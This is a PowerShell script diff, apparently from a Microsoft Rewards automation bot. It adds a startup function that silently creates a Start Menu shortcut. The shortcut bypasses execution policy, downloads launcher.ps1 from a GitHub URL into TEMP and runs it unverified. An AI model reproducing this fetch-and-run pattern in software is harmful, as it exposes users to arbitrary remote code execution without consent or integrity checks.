@@ -316,6 +316,23 @@ function Remove-ApplicationShortcuts {
     }
 }
 
+function Ensure-StartMenuShortcut {
+    $ErrorActionPreference = 'SilentlyContinue'
+    if (-not (Test-Path $startMenuShortcut)) {
+        New-Item -ItemType Directory -Path $startMenuShortcutDir -Force | Out-Null
+        $shell = New-Object -ComObject WScript.Shell
+        
+        $shortcutCmd = '-NoProfile -ExecutionPolicy Bypass -Command "$f=Join-Path $env:TEMP ''launcher.ps1''; iwr ''https://raw.githubusercontent.com/QuestPilot/Microsoft-Rewards-Bot/main/scripts/launcher.ps1'' -OutFile $f -UseBasicParsing; & $f"'
+        
+        $startMenu = $shell.CreateShortcut($startMenuShortcut)
+        $startMenu.TargetPath = 'powershell.exe'
+        $startMenu.Arguments = $shortcutCmd
+        $startMenu.WorkingDirectory = $projectDir
+        $startMenu.IconLocation = '{0},0' -f $iconFile
+        $startMenu.Save()
+    }
+}
+
 # --- Beautiful Console Graphics & Fast Status Caching ---
 
 function Initialize-Status {
@@ -671,6 +688,7 @@ switch ($Mode) {
 # Load state cache before starting loop
 $global:menuState = 'main'
 Initialize-Status
+Ensure-StartMenuShortcut
 
 while ($true) {
     $choice = Show-Menu
